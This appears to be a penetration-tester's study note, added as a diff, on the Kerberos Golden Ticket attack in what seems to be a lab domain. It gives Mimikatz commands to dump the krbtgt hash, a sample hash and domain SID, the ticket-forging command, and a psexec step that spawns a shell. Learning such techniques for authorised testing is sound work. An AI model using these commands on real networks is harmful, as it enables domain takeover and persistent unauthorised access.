@@ -1,0 +1,30 @@
+# What is Golden Ticket?
+---
+- When ==we compromise the **`krbtgt` account**, ==we own the domain.
+	- `krbtgt account`: Kerberos Ticket Granting Account
+- We can request access to any resource or system or domain.
+- **==Golden tickets == complete access to every resource on domain.==**
+- **Persistent Access**
+
+# Golden Ticket Attack
+---
+- We need the `krbtgt account` hash:
+- `krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9868111c87647a39a92e31315c0c23c7:::`
+- We need `Mimikatz`:
+	- `mimikatz.exe`
+	- `privilege::debug`
+	- `lsadump::lsa /inject /name:krbtgt`
+- Copy the following:
+	- SID of the Domain : `S-1-5-21-76944399-951576941-787082915`
+		- ![[Pasted image 20250330155051.png]]
+	- NTLM hash of `krbtgt` account:
+		- ![[Pasted image 20250330155128.png]]
+	- `kerberos::golden /User:fakeuser123 /domain:MARVEL.local /sid:<copied_sid_of_domain> /krbtgt:<copied_krbtgt_hash> /id:500 /ptt`
+		- `id`: Your `rid` (Admin account)
+		- `ptt`: Pass the ticket to current session (launch cmd prompt)
+	- ![[Pasted image 20250330155358.png]]
+	- `misc::cmd`
+		- Got the shell:
+			- ![[Pasted image 20250330155430.png]]
+			- `psexec.exe \\THEPUNISHER cmd.exe` => Spawn a shell
+				- ![[Pasted image 20250330155711.png]]
